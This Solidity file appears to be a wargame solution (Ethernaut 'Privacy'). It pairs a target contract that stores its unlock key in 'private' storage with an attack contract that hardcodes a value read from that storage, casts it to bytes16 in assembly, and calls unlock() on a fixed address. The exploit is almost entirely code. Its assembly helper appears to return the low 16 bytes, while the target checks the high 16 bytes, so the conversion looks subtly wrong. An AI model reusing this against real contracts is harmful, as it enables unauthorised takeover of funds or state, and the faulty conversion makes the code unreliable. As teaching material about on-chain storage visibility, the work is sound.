// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10; // Latest solidity version

import './Privacy.sol';

contract HackPrivacy {

  Privacy public originalContract = Privacy(0xabeB484Aa5db9407828f83fF80F432c715DD3181); 
  bytes32 stor4;
  bytes16 unlocker;


  function hack() public {
    stor4 = 0xb64c287685f1a12859e4d3b858c2dc4fc95e407660c2a194038251de6f66a079;
    unlocker = transformTo16(stor4);
    originalContract.unlock(unlocker);
  }

  function transformTo16(bytes32 source) internal pure returns(bytes16) {
    bytes16[2] memory y = [bytes16(0), 0];
    assembly {
      mstore(y, source)
      mstore(add(y, 16), source)
    }
    return y[1];
  }

}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10; // Latest solidity version

contract Privacy {

  bool public locked = true;
  uint256 public ID = block.timestamp;
  uint8 private flattening = 10;
  uint8 private denomination = 255;
  uint16 private awkwardness = uint16(block.timestamp);
  bytes32[3] private data;

  constructor(bytes32[3] memory _data) public {
    data = _data;
  }
  
  function unlock(bytes16 _key) public {
    require(_key == bytes16(data[2]));
    locked = false;
  }

  /*
    A bunch of super advanced solidity algorithms...

      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
  */
}